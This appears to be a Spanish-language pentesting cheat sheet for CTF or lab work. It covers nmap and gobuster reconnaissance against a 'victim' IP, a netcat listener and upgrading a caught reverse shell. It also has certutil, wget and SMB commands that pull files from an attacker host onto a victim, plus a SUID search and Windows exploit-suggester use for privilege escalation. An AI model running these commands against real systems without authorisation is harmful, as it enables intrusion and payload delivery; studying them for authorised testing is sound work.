####### identificar puertos abeirtos #######
nmap -sS -p- --open -min-rate 5000 -n -vvv -Pn <ip victima>  -oG allPorts  //se guarda en formato grepeable para poder extraer los puertos con extractports
// -sS escaneo sigiloso 
// -p- escanea todos los puertos --open 
// -min-rate 5000 Intenta enviar al menos 5000 paquetes por segundo
//  -n No realiza resolución DNS
// -vvv Muestra resultados muy detallados 
// -Pn Desactiva la detección de hosts


####### identificar versiones de los puertos abiertos ######
nmap -sV -sC -p<puertos separados por ,> -n -v -Pn <ip victima> -oA scan
// -sV deteccion de versiones
// -sC ejecuta scripts por defecto
// -n No realiza resolución DNS
// -v muestra resultados detallados
// -Pn Desactiva la detección de hosts


####### gobuster ########
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x .txt,.php -t 100 | grep -v "301"
// dir para directorio
//-u para la url
// -w para pasarle el diccionario
// -x para agregar .txt a todos los datos del diccionario
// -t para los hilos
// | grep -v "301" para no mostrar los status


####### colocarse en escucha ########
nc -lvnp <puerto>


####### abrir un servidor para transferir archivos ############
python3 -m http.server <puerto>


####### escalacion de privilegios en Windows (Windows-Exploit-Suggester) ###############
// en el windows se coloca el comando systeminfo y ese output se guarda en linux en un archivo llamado systeminfo.txt
python2 windows-exploit-suggester -u //descarga el archivo
python2 windows-exploit-suggester -d (archivo descargado) -i systeminfo.txt


######## transferir archivos de linux a windows ###########
//en linux abrir un servidor
certutil.exe -f -urlcache -split http://<ip que esta enviando el archivo>:<puerto>/archivo.extension archivo.extension
2
Linux: impacket-smbserver recurso $(pwd) -smb2support
windows: copy \\<ip atacante>\archivo.extension archivo.extension


######## transferir archivos de linux a linux ##########
//abrir servidor
wget http://<ip que esta enviando el archivo>:<puerto>/archivo.etension -O archivo.extension


######## saber permisos en linux ########
permisos sudo: sudo -l
permisos suid: find / -type f -perm -4000 -ls 2>/dev/null


######## mejorar bash ######## 
>script /dev/null -c bash
crtl + z
>stty raw -echo; fg
>reset xterm
>export TERM=xterm
stty size //en la terminal del atacante para saber el tamaño
stty rows <rows> columns <columns> //en la terminal de la victima para ajustar el tamaño
